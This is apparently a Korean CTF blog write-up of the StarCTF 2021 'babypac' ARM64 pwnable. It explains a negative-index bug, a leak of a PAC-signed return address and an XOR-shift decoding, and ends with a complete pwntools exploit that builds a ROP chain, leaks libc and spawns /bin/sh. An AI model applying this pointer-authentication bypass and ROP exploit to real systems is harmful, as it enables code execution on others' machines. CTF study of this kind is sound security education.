---
title: StarCTF 2021 - babypac
categories:
 - pwnable
tags: pac, arm, rop, stack
---

  

- Introduction
- Vunlnerability
- Exploit
- Decrypt
- slv.py
- Review       
- Reference

정말 오랜만에 포스팅을 진행한다. 3월즈음에 올리려고 했던 babypac 풀이를 지금 올린다.. 하하..

3학년 1학기에 5전공하니까 정말 너무 힘들었다.

# Introduction


    Arch:     aarch64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

해당 문제는 ARM 64bit 환경에서 만들어진 바이너리이다.

PAC 보호기법이 적용되어 있다. 이를 대충 설명하자면 64bit중 포인터로 사용하지 않는 상위자리의 bit에 kernel이 제공하는 key와 process의 context를 가지고 해당 pointer를 encrypt, decrypt를 통해서 공격자가 포인터에 대한 조작을 할 수 없게 만든다.

자세한 내용은 구글에 검색해서 알아보도록 하자.

`lock`

store에 저장되어 있는 id가 lock이 되있지 않다면 encrypt를 해준다.

```c
unsigned __int64 __fastcall sub_4009D8(__int64 a1)
{
  return a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11)) << 31) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11)) << 31)) >> 13);
}
```

`a1`에 id가 들어가게 되면서 encrypt가 된다.

`show`

```c
__int64 show_0x400C0C()
{
  __int64 result; // x0
  int i; // [xsp+Ch] [xbp-4h]

  result = printf("name: %s\n", name_0x412030);
  for ( i = 0; i < 5; ++i )
  {
    if ( store_412050[2 * i] )
    {
      if ( store_412050[2 * i + 1] == 1LL )
        result = printf("%d: **censored**\n", (unsigned int)i);// if store is locked
      else
        result = printf("%d: %ld\n", (unsigned int)i, store_412050[2 * i]);
    }
  }
  return result;
}
```


`auth`

```c
__int64 auth_0x400CDC()
{
  __int64 input; // x0
  __int64 name; // [xsp+0h] [xbp-20h]

  printf("idx: ");
  input = getinput_0x400988();
  if ( (int)input < 5
    && *(_QWORD *)&name_0x412030[16 * (int)input + 0x20]
    && *(_QWORD *)&name_0x412030[16 * (int)input + 0x28] == 1LL )
  {
    name = *(_QWORD *)&name_0x412030[16 * (int)input + 0x20];
    input = encode_0x4009D8(0x10A9FC70042LL);
    if ( name == input )
      input = vuln_0x400BDC();
  }
  return input;
}
```
</br></br>
# Vunlnerability

1. `lock`, `auth` 함수에서 index의 범위를 검사하지 않아서 음수가 허용된다.
2. `auth`에 `stack overflow`가 일어나는 backdoor가 존재한다.
</br></br>
# Exploit

backdoor를 사용하기 위해서 `auth`에 접근해야 하는데 idx를 받을때 `atoi`함수를 통해서 32비트만 받기 때문에 `0x10A9FC70042`를 만들 수 없다.

따라서 store 앞쪽에 `name` 변수가 존재하기 때문에 `lock`, `auth`에서의 취약점을 이용해 `name`을 store 형식으로 넣어줘서 backdoor에 진입하게끔 해준다.

여기서 문제는 

```assembly
vuln_0x400BDC      vuln_0x400BDC
vuln_0x400BDC
vuln_0x400BDC      var_s0=  0
vuln_0x400BDC
vuln_0x400BDC      PACIASP
vuln_0x400BDC+4    SUB             SP, SP, #0x30
vuln_0x400BDC+8    STP             X29, X30, [SP,#0x20+var_s0]
vuln_0x400BDC+C    ADD             X29, SP, #0x20
vuln_0x400BDC+10   MOV             W8, WZR
vuln_0x400BDC+14   MOV             X2, #0x100 ; nbytes
vuln_0x400BDC+18   MOV             X1, SP  ; buf
vuln_0x400BDC+1C   MOV             W0, W8  ; fd
vuln_0x400BDC+20   BL              .read
vuln_0x400BDC+24   LDP             X29, X30, [SP,#0x20+var_s0]
vuln_0x400BDC+28   ADD             SP, SP, #0x30 ; '0'
vuln_0x400BDC+2C   RETAA
```

마지막에 `RETAA`를 사용하게 되는데 이는 `PACIASP` 명령어를 통해서 return address를 sp, key값으로 sign을 한 포인터가 맞는지 검증한 후에 return을 하게 된다.

이 때문에 무지성으로 return address를 담으면 안되는데 이는 

```assembly
lock_0x400AFC+74   loc_400B70
lock_0x400AFC+74   LDURSW          X8, [X29,#var_4]
lock_0x400AFC+78   LSL             X8, X8, #4
lock_0x400AFC+7C   ADRL            X9, store_412050
lock_0x400AFC+84   LDR             X8, [X9,X8]
lock_0x400AFC+88   STR             X8, [SP,#0x20+var_10]
lock_0x400AFC+8C   LDR             X8, [SP,#0x20+var_10]
lock_0x400AFC+90   PACIA           X8, SP
lock_0x400AFC+94   STR             X8, [SP,#0x20+var_10]
lock_0x400AFC+98   LDR             X0, [SP,#0x20+var_10]
lock_0x400AFC+9C   STR             X9, [SP,#0x20+var_20]
lock_0x400AFC+A0   BL              encode_0x4009D8
lock_0x400AFC+A4   STR             X0, [SP,#0x20+var_10]
lock_0x400AFC+A8   LDR             X8, [SP,#0x20+var_10]
lock_0x400AFC+AC   LDURSW          X9, [X29,#var_4]
lock_0x400AFC+B0   LSL             X9, X9, #4
lock_0x400AFC+B4   LDR             X10, [SP,#0x20+var_20]
lock_0x400AFC+B8   STR             X8, [X10,X9]
lock_0x400AFC+BC   LDURSW          X8, [X29,#var_4]
lock_0x400AFC+C0   ADD             X8, X10, X8,LSL#4
lock_0x400AFC+C4   MOV             W11, #1
lock_0x400AFC+C8   MOV             W9, W11
lock_0x400AFC+CC   STR             X9, [X8,#8]
lock_0x400AFC+D0   B               loc_400BD0
```

`lock`함수에서 store의 id를 encrypt할때 넘어가는 인자를 `PACIA    X8, SP` 명령어를 통해서 sign을 하고 가게 된다. 여기서 우리는 넘어가는 인자를 return하고 싶은 주소의 값으로 넣게 되면 signed된 pointer를 얻을 수 있게 되는데

그 이유는 key는 동일하고 현재 `lock`함수에서 `PACIA    X8, SP`를 실행할때의 SP값과 `backdoor` 함수 내부에서 `PACIASP`를 실행할때의 SP값이 동일하기 때문이다.

이제 넘어간 값은 `show` 함수에서 `name : %s`에서 노출되게 되게 되는데 하지만 이는 encrypt함수에서 연산이 끝난 값이기 때문에 복호화 과정을 통해 signed pointer를 얻을 수 있게 된다.

이후 backdoor에서 stack overflow를 유발한 뒤에 `return-to-csu` 기법과 비슷하게 0x400F90 함수를 이용해서 ROP gadget을 엮어주면 된다.
</br>

# Decrypt

방법은 두가지인데 

첫 번째는 정석적으로 해당 암호화를 보고 복호화 루틴을 통해 복호화를 하는것이고

두 번째는 0x000xxxxxxxxxxxxx ~ 0xfffxxxxxxxxxxxx의 값을 모두 암호화 시킨뒤 mapping 시키는 방법이 있다.

사실 두 번째 방식이 좀 더 섹시한것 같지만 우직하게 첫 번째 방법을 진행해보도록 하겠다.

```c
unsigned __int64 __fastcall sub_4009D8(__int64 a1)
{
  return a1 ^ (a1 << 7) ^ 
  
  ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11) ^ 
  
  ((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11)) << 31) ^ 

  ((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11)) << 31)) >> 13);
}
```

`a1` => n0

`a1 ^ (a1 << 7)` => n1

`(a1 ^ (unsigned __int64)(a1 << 7)) >> 11` => n2

`((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11)) << 31)` => n3

`((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (unsigned __int64)(a1 << 7)) >> 11)) << 31)) >> 13)` => n4

로 정의를 하게 되면

`n2 = n1 >> 11`

`n3 = (n1 ^ (n1 >> 11)) << 31 = (n1 ^ n2) << 31`

`n4 = (n1 ^ n2 ^ ((n1 ^ n2) << 31)) >> 13 = (n1 ^ n2 ^ n3) >> 13`
이 되게 된다.

여기서 return값을 e로 정의하면

`e = n1 ^ n2 ^ n3 ^ n4`가 되고

`e = (n1 ^ n2 ^ n3) ^ ((n1 ^ n2 ^ n3) >> 13)`가 되므로

e의 상위 13bit는 `n1 ^ n2 ^ n3`값이 되게 된다. 이후 해당 13bit를 가지고 바로 아래 13bit와 xor연산을 하게 되면 26bit를 알 수 있게 되고 차례차례 진행하면 64bit 전체를 알 수 있게 된다.

이러한 연산을 마치고 나면 `n1 ^ n2 ^ n3`의 값을 알 수 있고

`n1 ^ n2 ^ n3 = (n1 ^ n2) ^ ((n1 ^ n2) << 31)` 임을 이용해 동일하게 진행하면 다음 단계로 진행되서 결국 d의 값, 즉 signed pointer의 값을 알 수 있게 된다.

이후 `libc_init_csu` 함수에서는 `RETAA` 명령어가 아닌 `RET`을 사용하기 때문에 signed pointer 없이도 익스 진행이 가능하게 된다.


# slv.py

  
```py
#!/usr/bin/python3

from pwn import *


context(arch = 'aarch64', os='linux', endian = 'little')
context.log_level = 'debug'


debug = 0

if debug == 1:

    io = process(['qemu-aarch64', "-cpu", "max", "-L", ".","-g","1234", "./chall"])

else:
    io = process(['qemu-aarch64', "-cpu", "max", "-L", ".", "./chall"])

e = ELF('./chall')
l = ELF('./lib/libc.so.6')

sla = lambda s,c : io.sendlineafter(s, str(c))
sa = lambda s,c : io.sendafter(s, str(c))
sl = lambda s : io.sendline(str(s))

_p64 = lambda s : p64(s).decode('latin-1')


csu_ret1 = 0x400FD8
csu_ret2 = 0x400FF8

read_got = e.got['read']
printf_got = e.got['printf']
read_plt = e.plt['read']
printf_plt = e.plt['printf']
pr_str = 0x4010BC
system_offset = l.symbols['system']
name_addr = 0x412030


def parse(start, end):

    return ((1<<start)-1) - ((1 << end)-1)


def dec(e):

    d = e

    i = 64

    while i > 0:

        d = d ^ ((d & parse(i,max(0, i-13))) >> 13)
        d &= (1<<64)-1

        i -= 13

    i = 0

    while i < 64:

        d = d ^ ((d & parse(min(64,i+31),i)) << 31)
        d &= (1<<64)-1

        i += 31


    i = 64

    while i > 0:

        d = d ^ ((d & parse(i,max(0, i-11))) >> 11)
        d &= (1<<64)-1

        i -= 11

    i = 0

    while i < 64:

        d = d ^ ((d & parse(min(64,i+7),i)) << 7)
        d &= (1<<64)-1

        i += 7

    return d


def add(id):

    sla('>> ', 1)

    sla(': ', id)
      
    return


def lock(idx):

    sla('>> ', 2)

    sla(': ', idx)

    return


def show():

    sla('>> ', 3)

    return io.recvuntil('===').decode('latin-1')


def auth(idx):

    sla('>> ', 4)

    sla(': ', idx)

    return


def main():

    name = ''
    name += _p64(csu_ret2)
    name += _p64(0)
    name += _p64(0x10A9FC70042)
    name += _p64(0)

    sla(': ', name) # send name

    add(12345)

    lock(-2)
    leak = u64(show().split('name: ')[1][:8])
    pac_ret = dec(leak)

    log.info("pac_encode : " + hex(leak))
    log.info("pac_decode : " + hex(pac_ret))

    lock(-1)
    auth(-1)

    payload = ''    
    payload += 'a'*0x28
    payload += _p64(pac_ret)

    payload += _p64(0) + _p64(csu_ret1) # dummy, ret
    payload += _p64(0) + _p64(1) # x19, x20
    payload += _p64(printf_got) + _p64(printf_got) # x21, x22
    payload += _p64(1) + _p64(2) # x23, x24

    payload += _p64(0) + _p64(csu_ret1) # dummy, ret
    payload += _p64(0) + _p64(1) # x19, x20
    payload += _p64(read_got) + _p64(0) # x21, x22
    payload += _p64(name_addr) + _p64(0x20) # x23, x24

    payload += _p64(1) + _p64(csu_ret1) # dummy, ret
    payload += _p64(0) + _p64(1) # x19, x20
    payload += _p64(name_addr) + _p64(name_addr+8) # x21, x22
    payload += _p64(7) + _p64(8) # x23, x24

    io.sendline(payload)

    libc_base = u64(io.recv().decode('latin-1').ljust(8, '\x00')) + 0x4000000000 - l.symbols['printf']
    system_addr = libc_base + system_offset

    log.info('libc_base : ' + hex(libc_base))
    log.info('system_addr : ' + hex(system_addr))


    payload = ''
    payload += _p64(system_addr)
    payload += '/bin/sh\x00'

    io.sendline(payload)

    io.interactive()

    return


if __name__ == '__main__':
    main()

```

# Review

PAC 관련 명령어를 실행시킬때 갑자기 `invalid pointer`가 뜨길래 무언가 잘못된줄 알았는데 그게 아니라 이때 사용되는 key값이 user mode에서 접근이 불가능해서 debugger에서 확인이 불가능했던것 같다.

# Reference

[https://blog.bi0s.in/2021/01/18/Pwn/StarCTF21-BabyPAC/](https://blog.bi0s.in/2021/01/18/Pwn/StarCTF21-BabyPAC/)

[https://a1ex.online/2021/01/31/2021-starCTF/](https://a1ex.online/2021/01/31/2021-starCTF/)

[https://www.xidoo.top/2021/01/23/starCTF2021/](https://www.xidoo.top/2021/01/23/starCTF2021/)

[https://www.xidoo.top/2021/01/23/qemu/](https://www.xidoo.top/2021/01/23/qemu/)
